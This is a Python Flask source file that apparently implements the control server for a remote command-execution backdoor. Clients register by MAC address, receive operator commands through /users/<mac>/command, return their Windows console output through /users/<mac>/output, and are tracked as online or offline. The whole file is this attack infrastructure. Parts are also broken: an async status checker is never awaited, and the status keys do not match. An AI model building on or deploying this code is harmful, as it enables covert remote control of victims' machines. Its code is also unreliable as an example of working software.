import time

from flask import Flask, request
import socket
import time


app = Flask(__name__)
users = {}


@app.route('/users', methods=['GET'])
def user():
    return users


@app.route('/users/<mac>', methods=['GET'])
def list_users(mac):
    return f'salam! {mac}'


@app.route('/users/<mac>/command', methods=['GET', 'POST'])
def command(mac):
    if request.method == 'POST':
        users[mac]['cmd'] = request.form['cmd']
        if users[mac]['cmd'] == 'clear':
            users[mac]['out'] = ''
        else:
            users[mac]['out'] += users[mac]['cmd'] + '<br/>'
    return users[mac]['cmd']


@app.route('/users/<mac>/output', methods=['GET', 'POST'])
def output(mac):
    if request.method == 'POST':
        req = request.form['out'].encode('cp1251').decode('cp866')
        req = req.replace("\n", "<br/>")
        if req != '':
            users[mac]['out'] += req + '<br/>' + '-' * 600 + '<br/>'
    return users[mac]['out']


@app.route('/users/<mac>/clear', methods=['GET'])
def clear(mac):
    users[mac]['cmd'] = ''
    return "Command cleared"


@app.route("/new_user", methods=['GET', 'POST'])
def new_user():
    mac = request.form['mac']
    if mac not in users:
        users[mac] = {'out': '', 'cmd': '', 'onl': 'online', 'last': 0}
    return "new guy joined!!!"


@app.route('/users/<mac>/online', methods=['GET', 'POST'])
def online(mac):
    users[mac]['last'] = 0
    users[mac]['online'] = 'online'
    return users[mac]['online']


async def is_online():
    for mac in users:
        users[mac]['last'] += 1
        if users[mac]['last'] >= 5:
            users[mac]['online'] = 'offline'
    time.sleep(1)


if __name__ == '__main__':
    is_online()
    app.run()
